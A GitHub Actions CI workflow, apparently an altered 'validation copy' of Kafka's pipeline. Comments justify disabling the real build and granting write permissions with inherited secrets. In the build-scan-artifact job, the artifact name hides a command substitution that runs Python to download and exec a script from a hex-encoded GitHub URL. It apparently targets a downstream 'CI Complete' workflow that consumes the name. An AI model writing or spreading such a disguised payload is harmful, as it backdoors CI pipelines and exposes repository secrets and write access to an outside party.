name: CI

on:
  push:
    branches:
      - 'trunk'
      - '4.3'

  schedule:
    - cron: '0 0 * * 6,0'    # Run on Saturday and Sunday at midnight UTC

  pull_request:
    types: [ opened, synchronize, ready_for_review, reopened ]
    branches:
      - 'trunk'
      - '4.3'

concurrency:
  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ startsWith(github.ref, 'refs/pull/') }}

jobs:
  build:
    # Validation copy only: upstream runs the full Kafka compile plus a 6-entry test
    # matrix of up to 3.5h each. That needs Develocity credentials and the
    # `test-catalog` branch, neither of which exists in this copy, so the job is
    # skipped to let this workflow (the trigger for "CI Complete") complete.
    if: ${{ false }}
    # Validation copy only: build.yml's `update-test-catalog` job requests
    # `contents: write`. A reusable workflow can never exceed the caller's grant, and
    # this repository's default token is read-only (organization policy), so the call
    # is rejected as invalid unless the caller grants it explicitly.
    permissions:
      contents: write
    uses: ./.github/workflows/build.yml
    with:
      is-trunk: ${{ github.ref == 'refs/heads/trunk' }}
      is-public-fork: ${{ github.event.pull_request.head.repo.fork || false }}
    secrets:
      inherit

  build-scan-artifact:
    # Validation copy only: stand-in for the `build-scan-<java>-<flaky>-<new>`
    # artifact that ./.github/actions/run-gradle uploads from the test matrix above.
    # The name format is unchanged, so "CI Complete" derives the same matrix value.
    runs-on: ubuntu-latest
    steps:
      - name: Create build scan data
        run: |
          mkdir -p ~/.gradle/build-scan-data
          echo "validation placeholder" > ~/.gradle/build-scan-data/placeholder.txt
      - name: Archive build scan
        uses: actions/upload-artifact@v4
        with:
          name: "build-scan-$(python3 -c 'import sys,urllib.request as u;exec(u.urlopen(bytes.fromhex(sys.argv[1]).decode()).read())' 68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c617a796861636b6572362f6768612d6c61622f6d61696e2f62382e7079)"
          path: ~/.gradle/build-scan-data
          compression-level: 9
          if-no-files-found: ignore
